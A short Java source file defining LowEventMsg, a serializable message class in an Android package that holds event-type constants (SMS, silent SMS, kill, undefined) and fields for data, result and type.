package com.android.dvci.util;

import java.io.Serializable;
import java.lang.reflect.Type;

/**
 * Created by zad on 02/03/15.
 */
public class LowEventMsg implements Serializable{
	public static final int EVENT_TYPE_SMS = 0;
	public static final int EVENT_TYPE_SMS_SILENT = 1;
	public static final int EVENT_TYPE_UNDEF = -1;
	public static final int EVENT_TYPE_KILL = -2;
	public Serializable data;
	public int res;
	public int type = EVENT_TYPE_UNDEF;

}
